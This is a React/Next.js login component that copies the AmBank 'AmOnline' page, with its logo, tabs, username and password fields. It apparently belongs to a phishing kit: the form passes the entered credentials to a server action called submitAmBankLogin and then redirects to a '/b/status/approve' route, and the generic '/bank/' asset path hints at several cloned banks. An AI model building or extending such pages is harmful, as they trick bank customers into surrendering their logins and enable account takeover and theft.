"use client";

import React, { useState } from "react";
import Image from "next/image";
import { User, Lock, Loader2, Menu } from "lucide-react";
import { submitAmBankLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function AmBankLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitAmBankLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#F8F9FA] font-sans text-[#333]">
      {/* Header */}
      <header className="flex items-center justify-between bg-white px-6 py-4 shadow-sm">
        <div className="flex items-center">
          <Image
            src="/bank/ambank.png"
            alt="AmBank Logo"
            width={160}
            height={40}
            className="h-10 w-auto"
          />
        </div>
        <button>
          <Menu size={24} className="text-gray-600" />
        </button>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-6 py-12">
        <div className="mb-10 text-center">
          <h2 className="text-3xl font-bold text-[#444] mb-2">Welcome to AmOnline!</h2>
          <p className="text-lg text-gray-500 font-medium">What would you like to do today?</p>
        </div>

        {/* Login Card */}
        <div className="w-full max-w-sm rounded-[32px] bg-white shadow-xl overflow-hidden border border-gray-100">
          {/* Tabs */}
          <div className="flex px-6 pt-6 gap-8 border-b border-gray-100">
            <button className="relative pb-4 text-[15px] font-bold text-[#333]">
              Log In Now
              <div className="absolute bottom-0 left-0 h-1 w-full bg-[#E31E24]" />
            </button>
            <button className="pb-4 text-[15px] font-bold text-gray-400">
              Register
            </button>
            <button className="pb-4 text-[15px] font-bold text-gray-400 whitespace-nowrap">
              Activate Card
            </button>
          </div>

          <div className="p-8">
            <form onSubmit={handleLogin} className="space-y-6">
              {error && (
                <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                  {error}
                </div>
              )}

              <div className="space-y-6">
                {/* Username */}
                <div className="space-y-1.5">
                  <label className="text-[13px] font-bold text-[#444]">Username</label>
                  <div className="relative group">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2">
                        <div className="h-8 w-8 rounded-full bg-[#007BFF] flex items-center justify-center">
                            <User size={18} className="text-white" />
                        </div>
                    </div>
                    <input
                      type="text"
                      placeholder="Enter your username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="w-full rounded-2xl border border-gray-200 bg-white py-4 pl-14 pr-4 text-[16px] outline-none transition-all focus:border-[#E31E24]"
                      required
                    />
                  </div>
                </div>

                {/* Password */}
                <div className="space-y-1.5">
                  <label className="text-[13px] font-bold text-[#444]">Password</label>
                  <div className="relative group">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2">
                        <div className="flex items-center justify-center">
                            <Lock size={20} className="text-[#FBC02D] fill-[#FBC02D] opacity-80" />
                        </div>
                    </div>
                    <input
                      type="password"
                      placeholder="Enter your password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full rounded-2xl border border-gray-200 bg-white py-4 pl-14 pr-4 text-[16px] outline-none transition-all focus:border-[#E31E24]"
                      required
                    />
                  </div>
                  <button type="button" className="text-[13px] font-medium text-[#E67E22] hover:underline ml-1">
                    Forgot username / password?
                  </button>
                </div>
              </div>

              {/* Login Button Area */}
              <div className="pt-6 -mx-8 -mb-8">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-[#FF5A5F] py-5 text-[17px] font-bold text-white transition-all active:scale-[0.98] disabled:opacity-80 flex items-center justify-center gap-2"
                >
                  {isLoading ? (
                    <Loader2 className="h-6 w-6 animate-spin" />
                  ) : (
                    "Log In Now"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* Footer info */}
        <p className="mt-10 text-[11px] text-gray-400 font-medium tracking-tight">
          ©AmOnline 2026 - v3.0.60
        </p>
      </main>
    </div>
  );
}
